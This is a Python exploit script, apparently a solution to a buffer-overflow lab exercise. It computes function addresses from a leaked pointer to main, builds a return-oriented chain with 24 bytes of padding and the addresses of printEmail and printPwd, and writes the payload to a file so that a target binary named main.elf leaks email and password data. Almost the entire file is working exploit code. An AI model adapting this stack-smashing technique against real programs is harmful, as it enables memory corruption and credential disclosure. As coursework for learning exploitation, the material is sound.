#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(f, v):
    assert isinstance(v, str)
    f.flush()
    f.write(v.encode("ascii"))
    f.flush()

def writeBytes(f, v):
    assert isinstance(v, bytes)
    f.flush()
    f.write(v)
    f.flush()

def writeLong(f, v):
    assert isinstance(v, int)
    f.flush()
    f.write(v.to_bytes(8, 'little'))
    f.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# Here we have the address of the main function.
pmain = int(sys.stdin.readline(), 16)

# Offsets from main to each function start (found via GDB)
# p (char*)&printEmail - (char*)&main = -192
# p (char*)&printPwd   - (char*)&main = -238
p_printEmail = pmain + (-192)
p_printPwd   = pmain + (-238)

# Offset from &content to saved rip inside process()
# saved rip at 0x7fffffffd498, &content at 0x7fffffffd480, 24 bytes
offset_content_to_rip = 24

eprint(f"pmain        = {hex(pmain)}")
eprint(f"p_printEmail = {hex(p_printEmail)}")
eprint(f"p_printPwd   = {hex(p_printPwd)}")

# ROP chain:
#   [24 bytes padding to reach saved rip]
#   [8 bytes printEmail address] = process() returns here, runs printEmail
#   [8 bytes printPwd address] = printEmail returns here, runs printPwd
rop_chain = (b"A" * offset_content_to_rip +
             p_printEmail.to_bytes(8, 'little') +
             p_printPwd.to_bytes(8, 'little'))

# Write the forged file: first line = byte count, then the payload bytes
with open("payload.txt", "wb") as f:
    writeStr(f, f"{len(rop_chain)}\n")
    writeBytes(f, rop_chain)

# Tell main.elf to read this file
print("payload.txt")
